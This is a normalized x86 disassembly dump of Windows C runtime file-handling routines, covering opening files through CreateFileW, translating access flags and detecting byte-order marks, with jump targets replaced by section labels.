inc ebx
sub [ ebp + 0x10 ] 0x1
je r-xdata
sub_43e3dc
push 0x14
push r--data
call sub_40d260
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] eax
push eax
push [ ebp + 0x10 ]
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x24 ]
push eax
call sub_43ee02
add esp 0x1c
mov esi eax
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43e455
test esi esi
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov eax [ ebp - 0x1c ]
call sub_42fef5
mov [ eax ] esi
jmp r-xdata
call sub_40d2a6
retn
or eax 0xffffffff
jmp r-xdata
sub_43e455
cmp [ ebp - 0x24 ] 0x0
je r-xdata
retn
test esi esi
je r-xdata
push [ ebp - 0x1c ]
call sub_4390d5
pop ecx
mov eax [ ebp - 0x1c ]
mov edx eax
sar edx 0x6
and eax 0x3f
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
and [ eax + ecx + 0x28 ] 0xfe
sub_43e48c
push 0x14
push r--data
call sub_40d260
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] eax
push eax
push [ ebp + 0x10 ]
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x24 ]
push eax
call sub_43eecd
add esp 0x1c
mov esi eax
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43e505
test esi esi
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov eax [ ebp - 0x1c ]
call sub_42fef5
mov [ eax ] esi
jmp r-xdata
call sub_40d2a6
retn
or eax 0xffffffff
jmp r-xdata
sub_43e505
cmp [ ebp - 0x24 ] 0x0
je r-xdata
retn
test esi esi
je r-xdata
push [ ebp - 0x1c ]
call sub_4390d5
pop ecx
mov eax [ ebp - 0x1c ]
mov edx eax
sar edx 0x6
and eax 0x3f
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
and [ eax + ecx + 0x28 ] 0xfe
sub_43e53c
push 0x10
push r--data
call sub_40d260
xor eax eax
mov esi [ ebp + 0x18 ]
test esi esi
setne al
test eax eax
jne r-xdata
or [ esi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
je r-xdata
call sub_42fef5
push 0x16
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
call sub_40d2a6
retn
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push esi
lea eax [ ebp - 0x20 ]
push eax
call sub_43ee02
add esp 0x1c
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43e5dc
test edi edi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
add eax 0x1
je r-xdata
mov eax edi
or [ esi ] 0xffffffff
sub_43e5dc
cmp [ ebp - 0x20 ] 0x0
je r-xdata
retn
test edi edi
je r-xdata
push [ esi ]
call sub_4390d5
pop ecx
mov ecx [ esi ]
mov eax ecx
sar eax 0x6
and ecx 0x3f
imul ecx ecx 0x30
mov eax [ eax * 4 + rw-data ]
and [ eax + ecx + 0x28 ] 0xfe
sub_43e608
push 0x10
push r--data
call sub_40d260
xor eax eax
mov esi [ ebp + 0x18 ]
test esi esi
setne al
test eax eax
jne r-xdata
or [ esi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
je r-xdata
call sub_42fef5
push 0x16
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
call sub_40d2a6
retn
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push esi
lea eax [ ebp - 0x20 ]
push eax
call sub_43eecd
add esp 0x1c
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43e6a8
test edi edi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
add eax 0x1
je r-xdata
mov eax edi
or [ esi ] 0xffffffff
sub_43e6a8
cmp [ ebp - 0x20 ] 0x0
je r-xdata
retn
test edi edi
je r-xdata
push [ esi ]
call sub_4390d5
pop ecx
mov ecx [ esi ]
mov eax ecx
sar eax 0x6
and ecx 0x3f
imul ecx ecx 0x30
mov eax [ eax * 4 + rw-data ]
and [ eax + ecx + 0x28 ] 0xfe
sub_43e6d4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x20 ]
push [ eax ]
mov eax [ ebp + 0x1c ]
push [ eax ]
mov eax [ ebp + 0x18 ]
push [ eax ]
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_43ee02
add esp 0x1c
pop ebp
retn
sub_43e706
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x20 ]
push [ eax ]
mov eax [ ebp + 0x1c ]
push [ eax ]
mov eax [ ebp + 0x18 ]
push [ eax ]
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_43eecd
add esp 0x1c
pop ebp
retn
sub_43e738
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x20 ]
push [ eax ]
mov eax [ ebp + 0x1c ]
push [ eax ]
mov eax [ ebp + 0x18 ]
push [ eax ]
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_43ee02
add esp 0x1c
pop ebp
retn
sub_43e76a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x20 ]
push [ eax ]
mov eax [ ebp + 0x1c ]
push [ eax ]
mov eax [ ebp + 0x18 ]
push [ eax ]
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_43eecd
add esp 0x1c
pop ebp
retn
sub_43e79c
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
and eax 0x3f
push ebx
push edi
mov edi [ ebp + 0x28 ]
xor ebx ebx
sar edx 0x6
imul ecx eax 0x30
mov [ edi ] bl
mov eax [ edx * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x80
jne r-xdata
push esi
mov esi [ ebp + 0x24 ]
test esi 0x74000
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
and eax 0x74000
cmp eax 0x4000
je r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ebx
push eax
call sub_42af4a
pop ecx
test eax eax
jne r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn
mov [ edi ] bl
cmp eax 0x10000
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_42fdfc
int3
mov eax [ ebp - 0x4 ]
and eax 0x74000
jne r-xdata
xor eax eax
test [ ebp + 0xc ] 0x40
jne r-xdata
mov ecx 0x301
mov eax esi
and eax ecx
cmp eax ecx
jne r-xdata
cmp eax 0x14000
je r-xdata
or esi eax
jmp r-xdata
or esi 0x4000
mov eax [ ebp + 0x10 ]
mov edx 0xc0000000
and eax edx
mov ecx ebx
mov esi ebx
cmp eax 0x40000000
je r-xdata
test esi 0x70000
je r-xdata
mov [ edi ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ebx
push eax
push [ ebp + 0x8 ]
call sub_4468b6
mov edx eax
add esp 0xc
test edx edx
jle r-xdata
cmp eax edx
jne r-xdata
cmp eax 0x40000
je r-xdata
xor esi esi
inc esi
cmp eax 0x4
jbe r-xdata
cmp edx 0xffffffff
je r-xdata
lea ecx [ esi - 0x1 ]
neg ecx
sbb ecx ecx
and esi ecx
mov [ edi ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
test esi esi
je r-xdata
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_43f625
add esp 0x10
or eax edx
je r-xdata
cmp eax 0x5
je r-xdata
call sub_42fef5
mov eax [ eax ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp edx 0x2
je r-xdata
movsx eax [ edi ]
mov esi ebx
mov [ ebp - 0x4 ] ebx
sub eax 0x1
je r-xdata
push ebx
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_43f625
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
pop esi
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp edx 0x3
jne r-xdata
push 0x3
mov [ ebp - 0x4 ] 0xbfbbef
pop esi
sub eax 0x1
jne r-xdata
mov ecx [ ebp + 0x10 ]
shr ecx 0x1f
jmp r-xdata
cmp eax 0xfeff
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_43f625
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp eax 0xbfbbef
jne r-xdata
mov eax esi
sub eax ebx
push eax
lea eax [ ebp - 0x4 ]
add eax ebx
push eax
push [ ebp + 0x8 ]
call sub_432a6c
add esp 0xc
cmp eax 0xffffffff
je r-xdata
test esi esi
jle r-xdata
push 0x2
mov [ ebp - 0x4 ] 0xfeff
pop esi
jmp r-xdata
test ecx ecx
je r-xdata
push ebx
push ebx
push 0x2
push [ ebp + 0x8 ]
call sub_43f625
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov [ edi ] 0x1
jmp r-xdata
add ebx eax
cmp esi ebx
jg r-xdata
mov [ edi ] 0x2
jmp r-xdata
jmp r-xdata
sub_43e9e9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x20 ]
or eax [ ebp + 0x24 ]
push 0x0
push eax
push [ ebp + 0x18 ]
push [ ebp + 0xc ]
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
call [ CreateFileW@IAT ]
pop ebp
retn
sub_43ea0e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
and eax 0x3
sub eax 0x0
je r-xdata
mov eax 0x80000000
pop ebp
retn
sub eax 0x1
je r-xdata
test [ ebp + 0x8 ] 0x70000
setne cl
test [ ebp + 0x8 ] 0x8
setne al
and cl al
movzx eax cl
neg eax
sbb eax eax
and eax 0x80000000
add eax 0x40000000
pop ebp
retn
sub eax 0x1
je r-xdata
mov eax 0xc0000000
pop ebp
retn
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
pop ebp
retn
sub_43ea71
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx 0x700
and eax edx
mov ecx 0x400
cmp eax ecx
jg r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp eax 0x600
je r-xdata
push 0x3
test eax eax
je r-xdata
push 0x5
jmp r-xdata
cmp eax edx
je r-xdata
cmp eax 0x100
je r-xdata
pop eax
pop ebp
retn
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
pop ebp
retn
push 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp eax 0x300
jne r-xdata
push 0x2
jmp r-xdata
sub_43eae1
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
push esi
mov esi [ ebp + 0x8 ]
and eax 0x3
push edi
mov edi 0x80000000
mov [ esi ] 0x0
sub eax 0x0
je r-xdata
mov eax edi
sub eax 0x1
je r-xdata
xor eax eax
sub eax ecx
je r-xdata
test ebx 0x70000
setne cl
test bl 0x8
setne al
and cl al
movzx eax cl
neg eax
sbb eax eax
and eax edi
add eax 0x40000000
jmp r-xdata
sub eax 0x1
je r-xdata
mov edi 0x8000
test edi ebx
jne r-xdata
or [ esi ] 0x10
xor eax eax
inc eax
jmp r-xdata
sub eax ecx
je r-xdata
push ebx
mov [ esi + 0x4 ] eax
call sub_43ea71
pop ecx
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
mov eax 0xc0000000
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
mov ecx 0x100
test ecx ebx
je r-xdata
test ebx 0x74000
jne r-xdata
and [ esi + 0x14 ] 0x0
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] 0x80
test bl bl
jns r-xdata
push 0x2
sub eax ecx
je r-xdata
test bl 0x40
je r-xdata
mov eax [ rw-data ]
not eax
and eax [ ebp + 0x14 ]
test al al
js r-xdata
or [ esi ] 0x80
lea eax [ ebp - 0x4 ]
push eax
call sub_42af4a
pop ecx
test eax eax
jne r-xdata
push 0x3
jmp r-xdata
sub eax 0x40
je r-xdata
test ebx 0x1000
je r-xdata
or [ esi + 0x14 ] 0x4000000
or [ esi + 0x4 ] 0x10000
or [ esi + 0xc ] 0x4
mov [ esi + 0x10 ] 0x1
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_42fdfc
int3
cmp [ ebp - 0x4 ] edi
je r-xdata
pop eax
jmp r-xdata
xor eax eax
cmp [ esi + 0x4 ] edi
sete al
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
test ebx 0x2000
je r-xdata
or [ esi + 0x10 ] ecx
test bl 0x20
je r-xdata
or [ esi + 0x14 ] 0x2000000
test bl 0x10
je r-xdata
or [ esi + 0x14 ] 0x8000000
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
or [ esi + 0x14 ] 0x10000000
sub_43ec5d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
xor eax eax
pop ebp
retn
sub eax ecx
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub eax ecx
je r-xdata
push 0x2
sub eax ecx
je r-xdata
push 0x3
jmp r-xdata
sub eax 0x40
je r-xdata
pop eax
pop ebp
retn
xor eax eax
cmp [ ebp + 0xc ] 0x80000000
sete al
pop ebp
retn
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
pop ebp
retn
sub_43ecb2
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi 0x8000
test [ ebp + 0x8 ] esi
je r-xdata
test [ ebp + 0x8 ] 0x74000
je r-xdata
xor al al
lea eax [ ebp - 0x4 ]
push eax
call sub_42af4a
pop ecx
test eax eax
jne r-xdata
mov al 0x1
jmp r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_42fdfc
int3
cmp [ ebp - 0x4 ] esi
setne al
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
sub_43ecfa
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
and eax 0x3f
mov edx esi
sar edx 0x6
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
mov al [ eax + ecx + 0x28 ]
test al 0x48
je r-xdata
test al al
jns r-xdata
xor eax eax
jmp r-xdata
push ebx
push edi
push 0x2
push 0xffffffff
push 0xffffffff
push esi
call sub_43f625
mov edi eax
mov ebx edx
mov ecx edi
add esp 0x10
and ecx ebx
cmp ecx 0xffffffff
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x4 ] ax
lea eax [ ebp - 0x4 ]
push 0x1
push eax
push esi
call sub_4468b6
add esp 0xc
test eax eax
jne r-xdata
call sub_42fee2
cmp [ eax ] 0x83
jne r-xdata
xor eax eax
push eax
push eax
push eax
push esi
call sub_43f625
and eax edx
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp - 0x4 ] 0x1a
jne r-xdata
call sub_42fef5
mov eax [ eax ]
jmp r-xdata
xor eax eax
push ebx
push edi
push esi
call sub_44602f
add esp 0xc
cmp eax 0xffffffff
je r-xdata
pop edi
pop ebx
sub_43edc2
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push 0x0
lea eax [ ebp - 0x4 ]
or esi 0xffffffff
push eax
push [ ebp + 0x14 ]
mov [ ebp - 0x4 ] esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43e53c
add esp 0x18
test eax eax
jne r-xdata
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_43ee02
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
call sub_445d51
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
mov esi [ ebp - 0x4 ]
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43eecd
push esi
mov edi eax
call sub_42d0aa
add esp 0x20
mov eax edi
pop edi
pop esi
or eax 0xffffffff
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_43ee53
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_43e53c
add esp 0x18
pop ebp
retn
sub_43ee8b
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push 0x0
lea eax [ ebp - 0x4 ]
or esi 0xffffffff
push eax
push [ ebp + 0x14 ]
mov [ ebp - 0x4 ] esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43e608
add esp 0x18
test eax eax
jne r-xdata
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_43eecd
mov edi edi
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x44 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push eax
call sub_43eae1
add esp 0x10
lea edi [ ebp - 0x2c ]
mov esi eax
push 0x6
pop ecx
[ edi ] [ esi ]
or esi 0xffffffff
cmp [ ebp - 0x20 ] esi
jne r-xdata
call sub_4390f8
mov ebx [ ebp + 0xc ]
mov [ ebx ] eax
cmp eax esi
jne r-xdata
call sub_42fee2
and [ eax ] 0x0
mov eax [ ebp + 0xc ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
lea esi [ ebp - 0x2c ]
and [ ebp - 0x10 ] 0x0
xor ecx ecx
inc ecx
mov [ ebp - 0x14 ] 0xc
sub esp 0x18
mov [ eax ] ecx
mov eax [ ebp + 0x14 ]
shr eax 0x7
not eax
and eax ecx
push 0x6
pop ecx
mov [ ebp - 0xc ] eax
mov edi esp
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x10 ]
[ edi ] [ esi ]
call sub_43e9e9
mov edi eax
add esp 0x20
mov [ ebp - 0x8 ] edi
mov edx 0xc0000000
cmp edi 0xffffffff
jne r-xdata
call sub_42fee2
and [ eax ] 0x0
mov [ ebx ] esi
call sub_42fef5
mov [ eax ] 0x18
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x28 ]
mov eax ecx
and eax edx
cmp eax edx
jne r-xdata
call sub_42fef5
mov eax [ eax ]
jmp r-xdata
cmp eax 0x2
jne r-xdata
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_42febf
pop ecx
mov ecx [ ebx ]
mov eax ecx
and ecx 0x3f
sar eax 0x6
imul ecx ecx 0x30
push edi
mov eax [ eax * 4 + rw-data ]
and [ eax + ecx + 0x28 ] 0xfe
call [ CloseHandle@IAT ]
test esi esi
jne r-xdata
mov ecx [ ebx ]
mov eax ecx
and ecx 0x3f
sar eax 0x6
imul ecx ecx 0x30
mov eax [ eax * 4 + rw-data ]
and [ eax + ecx + 0x28 ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_42febf
test [ ebp + 0x14 ] 0x1
je r-xdata
cmp eax 0x3
mov al [ ebp - 0x2c ]
jne r-xdata
mov al [ ebp - 0x2c ]
or al 0x40
jmp r-xdata
call sub_42fef5
mov [ eax ] 0xd
jmp r-xdata
sub esp 0x18
lea eax [ ebp - 0x14 ]
and ecx 0x7fffffff
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x28 ] ecx
push 0x6
pop ecx
mov edi esp
push eax
push [ ebp + 0x10 ]
[ edi ] [ esi ]
call sub_43e9e9
mov edi eax
add esp 0x20
mov [ ebp - 0x8 ] edi
cmp edi 0xffffffff
jne r-xdata
push edi
push [ ebx ]
mov [ ebp - 0x1 ] al
call sub_439041
mov dl [ ebp - 0x1 ]
pop ecx
pop ecx
mov ecx [ ebx ]
or dl 0x1
mov eax ecx
mov [ ebp - 0x1 ] dl
and ecx 0x3f
sar eax 0x6
imul ecx ecx 0x30
mov [ ebp - 0x2c ] dl
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x28 ] dl
mov ecx [ ebx ]
mov eax ecx
and ecx 0x3f
sar eax 0x6
imul ecx ecx 0x30
test [ ebp + 0x14 ] 0x2
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x29 ] 0x0
je r-xdata
or al 0x8
lea eax [ ebp - 0x2 ]
mov [ ebp - 0x2 ] 0x0
push eax
push [ ebp + 0x14 ]
lea esi [ ebp - 0x2c ]
sub esp 0x18
push 0x6
pop ecx
mov edi esp
push [ ebx ]
[ edi ] [ esi ]
call sub_43e79c
add esp 0x24
test eax eax
je r-xdata
push [ ebx ]
call sub_43ecfa
mov esi eax
pop ecx
test esi esi
jne r-xdata
mov eax [ ebx ]
mov ecx eax
and eax 0x3f
sar ecx 0x6
imul edx eax 0x30
mov al [ ebp - 0x2 ]
mov ecx [ ecx * 4 + rw-data ]
mov [ ecx + edx + 0x29 ] al
mov ecx [ ebx ]
mov eax ecx
sar eax 0x6
and ecx 0x3f
imul edx ecx 0x30
mov ecx [ eax * 4 + rw-data ]
mov eax [ ebp + 0x14 ]
shr eax 0x10
xor al [ ecx + edx + 0x2d ]
and al 0x1
xor [ ecx + edx + 0x2d ] al
test [ ebp - 0x1 ] 0x48
jne r-xdata
mov esi eax
push [ ebx ]
call sub_4323c6
pop ecx
mov eax esi
jmp r-xdata
mov esi [ ebp - 0x28 ]
mov ecx 0xc0000000
mov eax esi
and eax ecx
cmp eax ecx
jne r-xdata
test [ ebp + 0x14 ] 0x8
je r-xdata
xor eax eax
test [ ebp + 0x14 ] 0x1
je r-xdata
mov ecx [ ebx ]
mov eax ecx
and ecx 0x3f
sar eax 0x6
imul ecx ecx 0x30
mov eax [ eax * 4 + rw-data ]
or [ eax + ecx + 0x28 ] 0x20
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
sub esp 0x18
lea eax [ ebp - 0x14 ]
and esi 0x7fffffff
mov [ ebp - 0x28 ] esi
lea esi [ ebp - 0x2c ]
push 0x6
pop ecx
mov edi esp
push eax
push [ ebp + 0x10 ]
[ edi ] [ esi ]
call sub_43e9e9
mov edx eax
add esp 0x20
cmp edx 0xffffffff
jne r-xdata
mov ecx [ ebx ]
mov eax ecx
sar eax 0x6
and ecx 0x3f
imul ecx ecx 0x30
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x18 ] edx
call [ GetLastError@IAT ]
push eax
call sub_42febf
mov ecx [ ebx ]
mov eax ecx
and ecx 0x3f
sar eax 0x6
imul ecx ecx 0x30
mov eax [ eax * 4 + rw-data ]
and [ eax + ecx + 0x28 ] 0xfe
push [ ebx ]
call sub_43920a
pop ecx
jmp r-xdata
pop ecx
jmp r-xdata
sub_43f1f6
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_43e608
add esp 0x18
pop ebp
retn
sub_43f216
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_42fef5
mov [ eax ] 0x9
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x9
call sub_42fdcf
cmp ecx [ rw-data ]
jae r-xdata
xor eax eax
pop ebp
retn
mov eax ecx
and ecx 0x3f
sar eax 0x6
imul ecx ecx 0x30
mov eax [ eax * 4 + rw-data ]
movzx eax [ eax + ecx + 0x28 ]
and eax 0x40
pop ebp
retn
sub_43f26c
push 0x14
push r--data
call sub_40d260
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_42fee2
and [ eax ] 0x0
call sub_42fef5
mov [ eax ] 0x9
jmp r-xdata
call sub_42fee2
and [ eax ] 0x0
call sub_42fef5
mov [ eax ] 0x9
call sub_42fdcf
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x6
mov eax esi
and eax 0x3f
imul ecx eax 0x30
mov [ ebp - 0x20 ] ecx
mov eax [ ebx * 4 + rw-data ]
movzx eax [ eax + ecx + 0x28 ]
and eax 0x1
je r-xdata
push esi
call sub_43901e
pop ecx
or edi 0xffffffff
mov [ ebp - 0x1c ] edi
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
test [ eax + ecx + 0x28 ] 0x1
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_43f45c
add esp 0xc
mov edi eax
mov [ ebp - 0x1c ] edi
call sub_42fef5
mov [ eax ] 0x9
call sub_42fee2
and [ eax ] 0x0
jmp r-xdata
call sub_40d2a6
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43f32e
mov eax edi
jmp r-xdata
sub_43f357
push 0x1c
push r--data
call sub_40d260
mov edi [ ebp + 0x8 ]
cmp edi 0xfffffffe
jne r-xdata
test edi edi
js r-xdata
call sub_42fee2
and [ eax ] 0x0
call sub_42fef5
mov [ eax ] 0x9
jmp r-xdata
call sub_42fee2
and [ eax ] 0x0
call sub_42fef5
mov [ eax ] 0x9
call sub_42fdcf
cmp edi [ rw-data ]
jae r-xdata
or esi 0xffffffff
mov edx esi
mov ecx edi
sar ecx 0x6
mov [ ebp - 0x1c ] ecx
mov eax edi
and eax 0x3f
imul edx eax 0x30
mov [ ebp - 0x20 ] edx
mov eax [ ecx * 4 + rw-data ]
movzx eax [ eax + edx + 0x28 ]
and eax 0x1
je r-xdata
push edi
call sub_43901e
pop ecx
or esi 0xffffffff
mov [ ebp - 0x2c ] esi
mov ebx esi
mov [ ebp - 0x28 ] ebx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x1c ]
mov eax [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
test [ eax + ecx + 0x28 ] 0x1
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_43f4b3
add esp 0x10
mov esi eax
mov [ ebp - 0x2c ] esi
mov ebx edx
mov [ ebp - 0x28 ] ebx
call sub_42fef5
mov [ eax ] 0x9
call sub_42fee2
and [ eax ] 0x0
jmp r-xdata
mov eax esi
call sub_40d2a6
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43f42f
mov edx ebx
jmp r-xdata
sub_43f45c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_43929b
pop ecx
cmp eax 0xffffffff
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_43f531
mov edx eax
add esp 0xc
cmp edx 0xffffffff
je r-xdata
call sub_42fef5
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
mov eax esi
and esi 0x3f
sar eax 0x6
imul ecx esi 0x30
